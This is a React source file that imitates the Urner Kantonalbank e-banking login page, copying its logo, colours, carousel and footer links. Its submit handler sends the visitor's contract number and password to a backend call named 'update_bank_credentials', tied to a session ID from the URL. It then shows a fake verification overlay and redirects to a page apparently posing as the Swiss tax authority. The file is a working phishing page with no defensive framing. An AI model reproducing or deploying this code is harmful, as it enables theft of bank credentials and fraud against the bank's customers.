import { useState, useEffect, useRef } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, ChevronLeft, ChevronRight } from "lucide-react";
import logoAsset from "@/assets/urner-kantonalbank-logo.svg.asset.json";
import ferienAsset from "@/assets/ukb-ferien.jpg.asset.json";
import kmuAsset from "@/assets/ukb-kmu.jpg.asset.json";
import kaffeeAsset from "@/assets/ukb-kaffee-gipfeli.jpg.asset.json";

const YELLOW = "#ffd300";
const BLUE = "#005b8b";
const OUTLINE = "#f0f0f0";

const slides = [
  {
    image: ferienAsset.url,
    title: "Ferien geplant? Fremdwährung einfach bestellen",
    text: "Bestellen Sie über 70 Fremdwährungen bequem von zu Hause und lassen Sie sie sich liefern.",
    linkText: "Jetzt bestellen",
  },
  {
    image: kmuAsset.url,
    title: "Immer an der Seite der Urner KMU",
    text: "Mit ganzheitlichen Lösungen unterstützen wir kompetent und unkompliziert Urner Unternehmen in jeder Phase.",
    linkText: "Beitrag lesen",
  },
  {
    image: kaffeeAsset.url,
    title: "Zuhören, verstehen, austauschen",
    text: "Die Mitglieder des Bankrats sowie der Geschäftsleitung der Urner Kantonalbank laden Sie herzlich zu Kaffee und Gipfeli in vier...",
    linkText: "Mehr erfahren",
  },
];

const quicklinks = [
  "Häufige Fragen",
  "Noch kein E-Banking?",
  "Support kontaktieren",
  "Neues Smartphone aktivieren",
];

const ChUrnerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [activeSlide, setActiveSlide] = useState(0);
  const touchStartX = useRef(0);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Urner Kantonalbank – E-Banking", logoAsset.url);

  const nextSlide = () => setActiveSlide((s) => (s + 1) % slides.length);
  const prevSlide = () => setActiveSlide((s) => (s - 1 + slides.length) % slides.length);

  useEffect(() => {
    const id = setInterval(() => {
      setActiveSlide((s) => (s + 1) % slides.length);
    }, 6000);
    return () => clearInterval(id);
  }, []);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-[#f5f5f5] md:bg-white">
        <main className="flex-1 px-0 py-0 md:px-4 md:py-14">
          <div className="w-full max-w-[1000px] mx-auto">
            {/* Main card */}
            <div
              className="bg-white flex flex-col md:border md:border-[#e5e5e5] md:rounded-md md:overflow-hidden md:h-[715px] md:shadow-[0_1px_3px_rgba(0,0,0,0.06)]"
            >
              {/* Full-width card header */}
              <div className="h-[40px] flex items-center px-4 md:px-6 bg-white shrink-0">
                <img src={logoAsset.url} alt="Urner Kantonalbank" className="h-[26px]" />
              </div>
              {/* 50% yellow + 50% gray divider */}
              <div className="flex h-[3px] shrink-0">
                <div className="flex-1" style={{ backgroundColor: YELLOW }} />
                <div className="flex-1 bg-[#ddd]" />
              </div>

              {/* Content grid */}
              <div className="flex flex-col md:grid md:grid-cols-2 md:flex-1 md:min-h-0">
                {/* Login (left) */}
                <div className="px-6 py-8 md:px-12 md:py-12 flex flex-col md:h-full order-1 md:order-none">
                  <h1 className="text-[24px] font-semibold text-black mb-6">Anmeldung E-Banking</h1>

                  <div className="mb-5">
                    <label className="block text-[13px] mb-1.5 text-[#333]">
                      Vertragsnummer
                    </label>
                    <input
                      type="text"
                      value={vertragsnummer}
                      onChange={(e) => setVertragsnummer(e.target.value)}
                      className="w-full px-3 py-2.5 border border-[#cccccc] outline-none text-[15px] rounded-[6px] bg-white"
                    />
                  </div>

                  <div className="mb-8">
                    <label className="block text-[13px] mb-1.5 text-[#333]">
                      Passwort
                    </label>
                    <div className="relative">
                      <input
                        type={showPassword ? "text" : "password"}
                        value={passwort}
                        onChange={(e) => setPasswort(e.target.value)}
                        className="w-full px-3 py-2.5 border border-[#cccccc] outline-none text-[15px] pr-10 rounded-[6px] bg-white"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-2 top-1/2 -translate-y-1/2"
                        aria-label="Passwort anzeigen"
                      >
                        {showPassword ? (
                          <EyeOff size={18} color="#666" />
                        ) : (
                          <Eye size={18} color="#666" />
                        )}
                      </button>
                    </div>
                  </div>

                  <div className="hidden md:block md:flex-1" />

                  <button
                    onClick={handleSubmit}
                    className="mx-auto block px-6 py-2.5 text-black font-bold text-[15px] rounded-[6px] hover:brightness-95 transition"
                    style={{ backgroundColor: YELLOW }}
                  >
                    Weiter
                  </button>

                  <div className="mt-5 flex flex-col gap-2 text-[14px] text-center">
                    <a
                      href="#"
                      className="transition-colors"
                      style={{ color: BLUE }}
                      onMouseEnter={(e) => (e.currentTarget.style.color = YELLOW)}
                      onMouseLeave={(e) => (e.currentTarget.style.color = BLUE)}
                    >
                      Passwort vergessen?
                    </a>
                    <a
                      href="#"
                      className="transition-colors"
                      style={{ color: BLUE }}
                      onMouseEnter={(e) => (e.currentTarget.style.color = YELLOW)}
                      onMouseLeave={(e) => (e.currentTarget.style.color = BLUE)}
                    >
                      E-Banking-Vertrag sperren
                    </a>
                  </div>
                </div>

                {/* Mobile quicklinks (between login and carousel) */}
                <div className="h-3 bg-[#f5f5f5] md:hidden order-2" />
                <div className="md:hidden order-2 bg-white px-6 py-4">
                  <ul className="flex flex-col gap-1.5">
                    {quicklinks.map((label) => (
                      <li key={label}>
                        <a
                          href="#"
                          className="flex items-center gap-1.5 text-[13px] w-fit"
                          style={{ color: BLUE }}
                        >
                          <ChevronRight size={14} />
                          <span>{label}</span>
                        </a>
                      </li>
                    ))}
                  </ul>
                </div>
                <div className="h-3 bg-[#f5f5f5] md:hidden order-2" />

                {/* Carousel (right) */}
                <div
                  className="relative group min-h-[420px] md:min-h-0 overflow-hidden bg-[#f5f5f5] order-3 md:order-none"
                  onTouchStart={(e) => { touchStartX.current = e.touches[0].clientX; }}
                  onTouchEnd={(e) => {
                    const dx = e.changedTouches[0].clientX - touchStartX.current;
                    if (dx > 40) prevSlide();
                    else if (dx < -40) nextSlide();
                  }}
                >
                  {slides.map((s, i) => (
                    <img
                      key={i}
                      src={s.image}
                      alt={s.title}
                      className="absolute inset-0 w-full h-full object-cover transition-opacity duration-700"
                      style={{ opacity: i === activeSlide ? 1 : 0 }}
                    />
                  ))}

                  {/* Hover chevron arrows (larger + bolder, no background) */}
                  <button
                    onClick={prevSlide}
                    aria-label="Vorheriges Bild"
                    className="absolute left-1 top-1/2 -translate-y-1/2 hidden md:flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity"
                  >
                    <ChevronLeft size={88} color="#fff" strokeWidth={2.5} style={{ filter: "drop-shadow(0 2px 4px rgba(0,0,0,0.5))" }} />
                  </button>
                  <button
                    onClick={nextSlide}
                    aria-label="Nächstes Bild"
                    className="absolute right-1 top-1/2 -translate-y-1/2 hidden md:flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity"
                  >
                    <ChevronRight size={88} color="#fff" strokeWidth={2.5} style={{ filter: "drop-shadow(0 2px 4px rgba(0,0,0,0.5))" }} />
                  </button>

                  {/* Caption block */}
                  <div
                    className="absolute left-4 right-4 bottom-4 px-5 py-4 backdrop-blur-md rounded-md"
                    style={{ backgroundColor: "rgba(255,255,255,0.78)" }}
                  >
                    <h3 className="font-semibold text-[15px] mb-1 text-black leading-snug">
                      {slides[activeSlide].title}
                    </h3>
                    <p className="text-[13px] leading-snug mb-2 text-[#222]">
                      {slides[activeSlide].text}
                    </p>
                    <a href="#" className="text-[13px] font-medium" style={{ color: BLUE }}>
                      {slides[activeSlide].linkText}
                    </a>

                    <div className="flex items-center justify-center gap-2 mt-3">
                      {slides.map((_, i) => (
                        <button
                          key={i}
                          onClick={() => setActiveSlide(i)}
                          aria-label={`Slide ${i + 1}`}
                          className="transition-all rounded-full"
                          style={{
                            height: 8,
                            width: 8,
                            backgroundColor: i === activeSlide ? YELLOW : "#cfcfcf",
                          }}
                        />
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Quicklinks card desktop-only (mobile renders inside main column) */}
            <div
              className="hidden md:block mt-6 rounded-md px-6 py-4 bg-transparent"
              style={{ border: `1px solid ${OUTLINE}` }}
            >
              <ul className="flex flex-col gap-1.5">
                {quicklinks.map((label) => (
                  <li key={label}>
                    <a
                      href="#"
                      className="flex items-center gap-1.5 text-[13px] w-fit"
                      style={{ color: BLUE }}
                    >
                      <ChevronRight size={14} />
                      <span>{label}</span>
                    </a>
                  </li>
                ))}
              </ul>
            </div>
          </div>
        </main>

        {/* Footer: white, no divider, blue text */}
        <footer className="bg-[#f5f5f5] md:bg-white">
          <div
            className="max-w-[1000px] mx-auto px-4 py-6 text-[13px] flex flex-col-reverse items-center text-center gap-2 md:flex-row md:justify-between md:text-left"
            style={{ color: BLUE }}
          >
            <span>© 2026 Urner Kantonalbank, Altdorf</span>
            <div className="flex items-center justify-center gap-6">
              <a
                href="https://www.ukb.ch/dam/dokumente/rechtliches/Basisdokumente.pdf"
                target="_blank"
                rel="noopener noreferrer"
                className="transition-colors"
                style={{ color: BLUE }}
                onMouseEnter={(e) => (e.currentTarget.style.color = YELLOW)}
                onMouseLeave={(e) => (e.currentTarget.style.color = BLUE)}
              >
                Nutzungsbedingungen
              </a>
              <a
                href="https://www.ukb.ch/hilfe-und-services/hilfe/digital-banking"
                target="_blank"
                rel="noopener noreferrer"
                className="transition-colors"
                style={{ color: BLUE }}
                onMouseEnter={(e) => (e.currentTarget.style.color = YELLOW)}
                onMouseLeave={(e) => (e.currentTarget.style.color = BLUE)}
              >
                Hilfe &amp; Services
              </a>
            </div>
          </div>
        </footer>
      </div>


    </>
  );
};

export default ChUrnerKantonalbank;
